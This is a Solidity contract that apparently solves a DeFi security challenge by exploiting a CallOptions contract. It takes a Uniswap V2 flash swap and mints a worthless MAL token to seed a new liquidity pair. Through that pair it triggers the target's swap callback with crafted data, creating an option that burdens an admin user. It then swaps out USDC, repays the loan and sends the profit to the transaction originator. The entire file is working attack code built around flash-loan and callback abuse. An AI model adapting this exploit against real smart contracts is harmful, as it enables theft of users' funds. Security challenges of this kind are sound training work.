// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { CallOptions } from "./CallOptions.sol";
import {IUniswapV2Factory} from "lib/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "lib/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import { Token } from "src/other/Token.sol";

contract CallOptionsExploiter {

    CallOptions callOptions;
    address adminUser;
    IUniswapV2Factory factory;
    IUniswapV2Router02 router;
    Token mal;
    Token usdc;
    Token weth;
    IUniswapV2Pair usdcMalPair;
    IUniswapV2Pair usdcDaiPair;
    IUniswapV2Pair usdcEthPair;
    uint nonce;

    constructor (address _callOptions, address _adminUser, address _router, address _factory, address _usdc, address _usdcDaiPair, address _usdcEthPair, address _weth) {
        callOptions = CallOptions(_callOptions);
        adminUser = _adminUser;
        router = IUniswapV2Router02(_router);
        factory = IUniswapV2Factory(_factory);
        usdc = Token(_usdc);
        usdcDaiPair = IUniswapV2Pair(_usdcDaiPair);
        usdcEthPair = IUniswapV2Pair(_usdcEthPair);
    }

    function startExploit() public {
        usdcDaiPair.swap(2_101e18, 0, address(this), bytes('not empty'));
    }

    function uniswapV2Call(
        address, 
        uint256 _amount0, // usdc - amount+fee
        uint256,
        bytes calldata
    ) external {
        // create new TOKEN, named MAL
        // flash loan to get 10 dai, add it as liquidity to USDC-MAL
        // subsequently, execute malicious logic to contracts uniswapV2Call with USDC-MAL contract, borrow MAL and return it
        // buy USDC with MAL auto-minted
        mal = new Token('MAL', 'MAL');
        mal.mint(address(this), 1_000_000_000e18);
        mal.approve(address(router), type(uint).max);
        usdc.approve(address(router), type(uint).max);
        router.addLiquidity(
            address(mal), address(usdc),
            _amount0, _amount0,
            0, 0,
            address(this), block.timestamp
        );
        usdcMalPair = IUniswapV2Pair(factory.getPair(address(mal),address(usdc)));

        // create Option which optionOwner is usdcMalPair but optionBuyer is adminUser2

        bytes memory data = abi.encode(callOptions.getLatestOptionId(), adminUser, 99_900e18);
        uint256 amount0Out = usdcMalPair.token0() == address(usdc) ? _amount0-1 : 0;
        uint256 amount1Out = amount0Out == 0 ? _amount0-1 : 0;
        usdcMalPair.swap(amount0Out, amount1Out, address(callOptions), data);
        address[] memory pathToUsdc = new address[](2);
        pathToUsdc[0] = address(mal);
        pathToUsdc[1] = address(usdc);
        mal.approve(address(router), type(uint).max);
        router.swapTokensForExactTokens(
            94_000e18, type(uint).max,
            pathToUsdc, address(this),
            block.timestamp
        );
        uint256 loanPlusInterestUSDC = (_amount0*(10**18)*1000/997/(10**18))+1; // exact amount owed
        usdc.transfer(address(usdcDaiPair), loanPlusInterestUSDC); // pay back flashloan
        usdc.transfer(tx.origin, usdc.balanceOf(address(this))); // goal
    }
}